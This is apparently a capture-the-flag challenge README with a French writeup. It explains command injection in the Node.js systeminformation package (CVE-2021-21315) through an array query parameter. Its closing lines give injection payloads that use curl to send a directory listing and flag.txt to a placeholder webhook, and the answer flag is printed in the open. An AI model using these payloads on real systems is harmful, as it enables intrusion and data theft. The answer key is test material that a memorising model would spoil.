# Quotes-A-Day 2 (API2)

> Web <br>
> Author: @Strix

## Prompt

OK, we've patched the previous vulnerability and finally implemented our new system health check feature. Users can now
query our **system information** to check if a site or a service is available or not and make sure to get their daily quote!

## Flag

FLAG: `FLAG-0WASP_T0P_9_PATCH_Y0UR_NPM_PACKAG3S`

## Outils nécessaires

- docker-compose

## Exécution

```bash
docker-compose up --build --force-recreate --renew-anon-volumes
```

## Writeup

Le défi ici est une vulnérabilité d'injection de commande dans un package très populaire de nodejs appelée [systeminformation](https://www.npmjs.com/package/systeminformation).
Le package a une vulnérabilité dans 4 fonctions dans lesquels un utilisateur fournit du input non filtré/_santized_.

L'injection de commande se produit ici par l'utilisation d'un tableau plutôt que d'une chaîne, en raison d'un manque de filtrage dans l'une des fonctions du package. (CVE-2021-21315)

Le endpoint `GET /systemInfo` requiert un paramètre `service`.

`GET /systemInfo?service=http://<URL:PORT>/quotes` retourne le statut du service de la route /quotes, mais

`/systemInfo?service[]=$(echo 'command injection')` injecterait la commande, puisque `systeminformation.inetChecksite(<USERINPUT>)` ne _sanitize_ pas les tableaux/listes/arrays, mais uniquement les chaînes de caractères.

L'utilisateur n'a donc qu'à parcourir le répertoire pour trouver le flag.txt. 

```curl
GET /systemInfo?service[]=$(ls -la > out.txt && curl --form "data=@out.txt" <SERVER/WEBHOOK>)
```

```curl
GET /systemInfo?service[]=$(curl --form "data=@flag.txt" <WEBHOOK>)
```
